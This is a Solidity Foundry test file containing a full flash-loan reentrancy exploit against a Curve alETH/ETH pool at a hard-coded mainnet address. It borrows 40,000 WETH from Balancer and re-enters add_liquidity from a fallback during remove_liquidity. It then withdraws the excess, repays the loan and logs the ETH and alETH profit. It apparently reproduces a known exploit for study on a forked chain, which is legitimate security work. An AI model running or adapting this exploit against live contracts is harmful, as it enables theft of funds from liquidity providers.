// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface ICurvePool {
  function add_liquidity(uint256[2] memory amounts, uint256 mins) external payable;
  function remove_liquidity(uint256 burn_amount, uint256[2] memory mins) external;
  function remove_liquidity_one_coin(uint256 burn_amount, int128 i, uint256 min) external;
  function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, bool use_eth) external;
}
interface IERC20 {
  function transfer(address to, uint256 amount) external;
  function approve(address to, uint256 amount) external;
  function balanceOf(address) external returns (uint256);
  function totalSupply() external returns (uint256);
}

interface ICurveToken is IERC20 {}
interface IWETH is IERC20 {
  function deposit() external payable;
  function withdraw(uint256 wad) external;
}

interface IBalanceFlashLoan {
  function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory data) external;
}

uint256 constant FLASH_AMOUNT = 40000 ether;
contract AttackTest is Test {
  IBalanceFlashLoan constant balancer = IBalanceFlashLoan(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
  IWETH constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  function test_attack() public {
    Attack attack = new Attack();

    address[] memory tokens = new address[](1);
    tokens[0] = address(weth);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = FLASH_AMOUNT;
    balancer.flashLoan(address(attack), tokens, amounts, '');
  }
}

contract Attack {
  ICurvePool constant pool = ICurvePool(0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e);
  ICurveToken constant token = ICurveToken(0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e);
  IWETH constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  IERC20 constant aleth = IERC20(0x0100546F2cD4C9D97f798fFC9755E47865FF7Ee6);
  IBalanceFlashLoan constant balancer = IBalanceFlashLoan(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

  function receiveFlashLoan(
      address[] memory,
      uint256[] memory amts,
      uint256[] memory,
      bytes memory
  ) external {
    weth.withdraw(amts[0]);

    // The 0 token in the pool is Ether, and the 1 is alETH
    // We add liquidity to the pool
    uint256[2] memory amounts;
    amounts[0] = amts[0]/2;
    pool.add_liquidity{value: amts[0]/2}(amounts, 0);

    // Now we remove liquidity from the pool, which will transfer ether to us and trigger our fallback
    amounts[0] = 0;
    pool.remove_liquidity(token.balanceOf(address(this)), amounts);

    // After our fallback has deposited more liquidity in the incorrect state, we withdraw our liquidity
    // for real. We can't redeem all our tokens because there aren't enough tokens!
    pool.remove_liquidity_one_coin(token.balanceOf(address(this))/2, 0, 0);

    // Pay back our flash loan
    weth.deposit{value: FLASH_AMOUNT}();
    weth.transfer(address(balancer), FLASH_AMOUNT);

    // The profit we are left with
    console.log('ETH: ', address(this).balance / 1 ether);
    console.log('alETH:', aleth.balanceOf(address(this)) /  1 ether);
  }

  // This variable is used so we only do our hack once ;)
  bool go = true;
  fallback() external payable {
    if (msg.sender == address(weth) || !go) { return; }
    go = false;
    uint256[2] memory amounts;
    amounts[0] = msg.value;
    pool.add_liquidity{value: amounts[0]}(amounts, 0);
  }
}
